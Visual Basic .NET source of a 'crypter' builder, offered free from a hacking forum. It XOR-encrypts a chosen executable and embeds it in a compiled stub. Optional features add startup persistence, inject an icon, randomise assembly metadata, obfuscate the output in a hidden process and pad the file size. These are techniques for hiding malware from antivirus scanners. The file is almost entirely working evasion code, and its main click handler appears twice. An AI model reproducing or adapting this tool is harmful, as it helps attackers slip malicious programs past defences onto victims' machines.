'Credits are in the CREDITS TAB!
'--------RECODERS.ORG--------'
'___FREE "CRYSTAL CRYPTER" source___'
Imports System.CodeDom.Compiler
Imports System.Text
Imports System.IO
Public Class Form1

    Public Shared crap As String
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try

            Dim sfd As New SaveFileDialog With {.Filter = ".exe|*.exe", .ShowHelp = True}
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim encryption_key As String = random_key(2)
                Dim source As String = My.Resources.source
                Dim vars As String() = {"%64%", "%1%", "%2%", "%4%"}
                Dim vars2 As String() = {"%5%", "%9%", "%10%", "%01%", "%55%"}
                For i As Integer = 0 To vars.Length - 1
                    source = source.Replace(vars(i), random_key(16))
                    source = source.Replace(vars2(i), random_key(7))
                Next

                If CheckBox4.Checked = True Then
                    source = source.Replace("msgoff", "msgon")
                    source = source.Replace("msghere", TextBox5.Text)
                    source = source.Replace("titlehere", TextBox6.Text)

                End If
                TextBox2.Text = source

                If CheckBox1.Checked = True Then
                    source = source.Replace("startoff", "starton")
                End If
                source = source.Replace("lolil", encryption_key)
                Dim input As Byte() = encrypt(IO.File.ReadAllBytes(TextBox1.Text), encryption_key)
                source = source.Replace("%3%", CD.format(input))
                crap = sfd.FileName
                Codedom(sfd.FileName, source, "")
                If CheckBox2.Checked = True Then
                    IconInjector.InjectIcon(sfd.FileName, TextBox3.Text)
                End If
                If CheckBox3.Checked = True Then
                    Dim Folder As String = Application.StartupPath & "\EazFuscator\"
                    IO.Directory.CreateDirectory(Folder)
                    Dim AGConfigurationSettingsProvidersdll As String = "AG.Configuration.SettingsProviders.dll"
                    Dim AGDeploymentUpdatingdll As String = "AG.Deployment.Updating.dll"
                    Dim AGEazfuscatorNETInstallerdll As String = "AG.Eazfuscator.NET.Installer.dll"
                    Dim AGEazfuscatorNETSettingsdll As String = "AG.Eazfuscator.NET.Settings.dll"
                    Dim AGEazfuscatorNETUpdatingdll As String = "AG.Eazfuscator.NET.Updating.dll"
                    Dim CastleCoredll As String = "Castle.Core.dll"
                    Dim CastleMicroKerneldll As String = "Castle.MicroKernel.dll"
                    Dim EazfuscatorNET As String = "Eazfuscator.NET.exe"
                    Dim ICSharpCodeSharpZipLibdll As String = "ICSharpCode.SharpZipLib.dll"
                    Dim MicrosoftCciMetadataHelperdll As String = "Microsoft.Cci.MetadataHelper.dll"
                    Dim MicrosoftCciMetadataModeldll As String = "Microsoft.Cci.MetadataModel.dll"
                    Dim MicrosoftCciMutableMetadataModeldll As String = "Microsoft.Cci.MutableMetadataModel.dll"
                    Dim MicrosoftCciPeReaderdll As String = "Microsoft.Cci.PeReader.dll"
                    Dim MicrosoftCciPeWriterdll As String = "Microsoft.Cci.PeWriter.dll"
                    Dim MicrosoftCciSourceModeldll As String = "Microsoft.Cci.SourceModel.dll"
                    Dim MonoCecildll As String = "Mono.Cecil.dll "
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGConfigurationSettingsProvidersdll, My.Resources.AG_Configuration_SettingsProviders, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGDeploymentUpdatingdll, My.Resources.AG_Deployment_Updating, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETInstallerdll, My.Resources.AG_Eazfuscator_NET_Installer, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETSettingsdll, My.Resources.AG_Eazfuscator_NET_Settings, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETUpdatingdll, My.Resources.AG_Eazfuscator_NET_Updating, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & CastleCoredll, My.Resources.Castle_Core, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & CastleMicroKerneldll, My.Resources.Castle_MicroKernel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & EazfuscatorNET, My.Resources.Eazfuscator_NET, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & ICSharpCodeSharpZipLibdll, My.Resources.ICSharpCode_SharpZipLib, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMetadataHelperdll, My.Resources.Microsoft_Cci_MetadataHelper, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMetadataModeldll, My.Resources.Microsoft_Cci_MetadataModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMutableMetadataModeldll, My.Resources.Microsoft_Cci_MutableMetadataModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciPeReaderdll, My.Resources.Microsoft_Cci_PeReader, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciPeWriterdll, My.Resources.Microsoft_Cci_PeWriter, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciSourceModeldll, My.Resources.Microsoft_Cci_SourceModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MonoCecildll, My.Resources.Mono_Cecil, False)
                    Dim FS As String = Application.StartupPath & "\Obfuscate.bat"
                    Dim SW As New IO.StreamWriter(FS)
                    SW.Write(EazfuscatorNET & " " & IO.Path.GetFileName(sfd.FileName))
                    SW.Flush()
                    SW.Close()
                    Dim P As New Process
                    P.StartInfo.FileName = FS
                    P.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    P.Start()
                    P.WaitForExit()
                    IO.File.Delete(FS)
                    Try
                        IO.Directory.Delete(Folder)
                    Catch
                    End Try
                End If
                MessageBox.Show("File encrypted successfully.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)

            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
#Region "Assembly Randomize/UpDown"
    Private Sub RandomizeBtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RandomizeBtn.Click
        Call AssemblyGen() 'If random button is clicked them a new random assembly
    End Sub
    Private Sub NumericUpDown1_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown1.ValueChanged
        Call AssemblyGen()
        'if the value changes then random assembly
    End Sub

    Public Sub AssemblyGen()
        'This will generate a random assembly each time it is called.
        Title_TextBox.Text = MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value))
        Description_TextBox.Text = MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value))
        Company_TextBox.Text = MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value))
        Product_TextBox.Text = MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value))
        Copyright_TextBox.Text = "(C) " & MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value - 4))
        Trademark_TextBox.Text = MyRandom.GenerateRandomString(True, True, True, False, CInt(NumericUpDown1.Value))
        ComVisible_ComboBox.SelectedItem = "False"
        Guid_TextBox.Text = Guid.NewGuid().ToString()
        Version_TextBox.Text = MyRandom.GenerateRandomVersion()
        FileVersion_TextBox.Text = MyRandom.GenerateRandomVersion()
        Language_TextBox.Text = "en-US"
    End Sub
#End Region

    Sub Codedom(ByVal Path As String, ByVal Code As String, ByVal MainClass As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String) 'Thanks to Cobac for adding this.
        providerOptions.Add("CompilerVersion", "v3.5")
        Dim CodeProvider As New Microsoft.CSharp.CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:X86 /unsafe /target:winexe"
            .MainClass = MainClass
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)
        End With
        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            For Each E In Results.Errors
                MsgBox(E.ErrorText)
            Next
        End If
    End Sub
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function encrypt(ByVal message As Byte(), ByVal password As String) As Byte()
        Dim passarr As Byte() = System.Text.Encoding.UTF8.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function
    Dim o As New OpenFileDialog With {.Filter = ".exe|*.exe", .ShowHelp = True}
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If o.ShowDialog = vbOK Then
            TextBox1.Text = o.FileName
            Label1.Text = o.FileName
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Codedom(crap, TextBox2.Text, "")
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.ShowIcon = False
        Label4.Text = "Stub Size : " & System.Text.Encoding.UTF8.GetBytes(My.Resources.source).Length \ 1024 & "Kb"
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            TextBox4.Enabled = True
            Button4.Enabled = True
        Else
            TextBox4.Enabled = False
            Button4.Enabled = False
        End If
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim ooo As New OpenFileDialog
        ooo.DefaultExt = "ico"
        ooo.Filter = "Icon Files (*.ico*)|*.ico*"
        ooo.FilterIndex = 1
        ooo.FileName = ""
        If ooo.ShowDialog(Me) = 1 Then
            Me.PictureBox1.Image = Image.FromFile(ooo.FileName)
            TextBox3.Text = ooo.FileName
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            TextBox6.Enabled = True
            TextBox5.Enabled = True
        Else
            TextBox6.Enabled = False
            TextBox5.Enabled = False
        End If
    End Sub


   

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If TextBox6.Text = "" Then
            MsgBox("Enter bytes to add")
        Else
            Dim file1 = File.OpenWrite(TextBox5.Text)
            Dim siza = file1.Seek(0, SeekOrigin.[End])
            Dim size = Convert.ToInt32(TextBox6.Text)
            Dim bite As Decimal = size * 1048576
            While siza < bite
                siza += 1
                file1.WriteByte(0)
            End While
            file1.Close()
            MessageBox.Show("Done !")
        End If
    End Sub

   

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MessageBox.Show("The mememory increaser is a extra that was added very fast we did not add this to the source.txt, this means you have to select your file afterwards.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
    End Sub

   
    Private Sub Button2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try

            Dim sfd As New SaveFileDialog With {.Filter = ".exe|*.exe", .ShowHelp = True}
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim encryption_key As String = random_key(2)
                Dim source As String = My.Resources.source
                Dim vars As String() = {"%64%", "%1%", "%2%", "%4%"}
                Dim vars2 As String() = {"%5%", "%9%", "%10%", "%01%", "%55%"}
                For i As Integer = 0 To vars.Length - 1
                    source = source.Replace(vars(i), random_key(16))
                    source = source.Replace(vars2(i), random_key(7))
                Next

                If CheckBox4.Checked = True Then
                    source = source.Replace("msgoff", "msgon")
                    source = source.Replace("msghere", TextBox5.Text)
                    source = source.Replace("titlehere", TextBox6.Text)

                End If
                TextBox2.Text = source

                If CheckBox1.Checked = True Then
                    source = source.Replace("startoff", "starton")
                End If
                source = source.Replace("lolil", encryption_key)
                Dim input As Byte() = encrypt(IO.File.ReadAllBytes(TextBox1.Text), encryption_key)
                source = source.Replace("%3%", CD.format(input))
                crap = sfd.FileName
                Codedom(sfd.FileName, source, "")
                If CheckBox2.Checked = True Then
                    IconInjector.InjectIcon(sfd.FileName, TextBox3.Text)
                End If
                If CheckBox3.Checked = True Then
                    Dim Folder As String = Application.StartupPath & "\EazFuscator\"
                    IO.Directory.CreateDirectory(Folder)
                    Dim AGConfigurationSettingsProvidersdll As String = "AG.Configuration.SettingsProviders.dll"
                    Dim AGDeploymentUpdatingdll As String = "AG.Deployment.Updating.dll"
                    Dim AGEazfuscatorNETInstallerdll As String = "AG.Eazfuscator.NET.Installer.dll"
                    Dim AGEazfuscatorNETSettingsdll As String = "AG.Eazfuscator.NET.Settings.dll"
                    Dim AGEazfuscatorNETUpdatingdll As String = "AG.Eazfuscator.NET.Updating.dll"
                    Dim CastleCoredll As String = "Castle.Core.dll"
                    Dim CastleMicroKerneldll As String = "Castle.MicroKernel.dll"
                    Dim EazfuscatorNET As String = "Eazfuscator.NET.exe"
                    Dim ICSharpCodeSharpZipLibdll As String = "ICSharpCode.SharpZipLib.dll"
                    Dim MicrosoftCciMetadataHelperdll As String = "Microsoft.Cci.MetadataHelper.dll"
                    Dim MicrosoftCciMetadataModeldll As String = "Microsoft.Cci.MetadataModel.dll"
                    Dim MicrosoftCciMutableMetadataModeldll As String = "Microsoft.Cci.MutableMetadataModel.dll"
                    Dim MicrosoftCciPeReaderdll As String = "Microsoft.Cci.PeReader.dll"
                    Dim MicrosoftCciPeWriterdll As String = "Microsoft.Cci.PeWriter.dll"
                    Dim MicrosoftCciSourceModeldll As String = "Microsoft.Cci.SourceModel.dll"
                    Dim MonoCecildll As String = "Mono.Cecil.dll "
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGConfigurationSettingsProvidersdll, My.Resources.AG_Configuration_SettingsProviders, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGDeploymentUpdatingdll, My.Resources.AG_Deployment_Updating, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETInstallerdll, My.Resources.AG_Eazfuscator_NET_Installer, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETSettingsdll, My.Resources.AG_Eazfuscator_NET_Settings, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & AGEazfuscatorNETUpdatingdll, My.Resources.AG_Eazfuscator_NET_Updating, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & CastleCoredll, My.Resources.Castle_Core, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & CastleMicroKerneldll, My.Resources.Castle_MicroKernel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & EazfuscatorNET, My.Resources.Eazfuscator_NET, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & ICSharpCodeSharpZipLibdll, My.Resources.ICSharpCode_SharpZipLib, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMetadataHelperdll, My.Resources.Microsoft_Cci_MetadataHelper, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMetadataModeldll, My.Resources.Microsoft_Cci_MetadataModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciMutableMetadataModeldll, My.Resources.Microsoft_Cci_MutableMetadataModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciPeReaderdll, My.Resources.Microsoft_Cci_PeReader, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciPeWriterdll, My.Resources.Microsoft_Cci_PeWriter, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MicrosoftCciSourceModeldll, My.Resources.Microsoft_Cci_SourceModel, False)
                    My.Computer.FileSystem.WriteAllBytes(Folder & MonoCecildll, My.Resources.Mono_Cecil, False)
                    Dim FS As String = Application.StartupPath & "\Obfuscate.bat"
                    Dim SW As New IO.StreamWriter(FS)
                    SW.Write(EazfuscatorNET & " " & IO.Path.GetFileName(sfd.FileName))
                    SW.Flush()
                    SW.Close()
                    Dim P As New Process
                    P.StartInfo.FileName = FS
                    P.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    P.Start()
                    P.WaitForExit()
                    IO.File.Delete(FS)
                    Try
                        IO.Directory.Delete(Folder)
                    Catch
                    End Try
                End If
                MessageBox.Show("File encrypted successfully.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)

            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
End Class
Public Class CD
    ' Thanks to pr0t0typ3 for adding the details about loops and strings.
    Public Shared Function format(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = Convert.ToBase64String(input) ' Get a readable String from the Byte Array
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " + " & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function
    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function
End Class